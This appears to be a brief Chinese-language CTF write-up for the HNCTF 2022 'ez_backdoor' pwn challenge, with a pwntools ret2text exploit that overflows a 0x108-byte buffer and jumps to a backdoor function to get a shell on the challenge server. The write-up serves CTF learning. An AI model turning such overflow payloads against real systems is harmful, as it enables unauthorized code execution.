[[HNCTF 2022 WEEK2]ez_backdoor | NSSCTF](https://www.nssctf.cn/problem/2999)
![[Pasted image 20240901150839.png]]
![[Pasted image 20240901150849.png]]
普通的ret2text，有backdoors，没什么好说的
exp:
```python
from pwn import *
import pwnlib.gdb

context(arch='amd64', os='linux', log_level='debug')
elf = ELF('./ez_backdoor')
local = False
if local:
    p = process('./ez_backdoor')
    # pwnlib.gdb.attach(p, 'b main')
else:
    p = remote("node5.anna.nssctf.cn", 27129)

backdoor = 0x4011CA
ret = 0x40101a
rdi = 0x4012c3
offset = 0x100 + 8
payload = b'A' * offset + p64(ret) + p64(backdoor)
p.recvuntil('challenge')
p.sendline(payload)
p.interactive()
```
![[Pasted image 20240901150952.png]]
虽然这边是显示108h的空间![[Pasted image 20240901151025.png]]
但汇编这边显示是100h，做的时候还是注意一下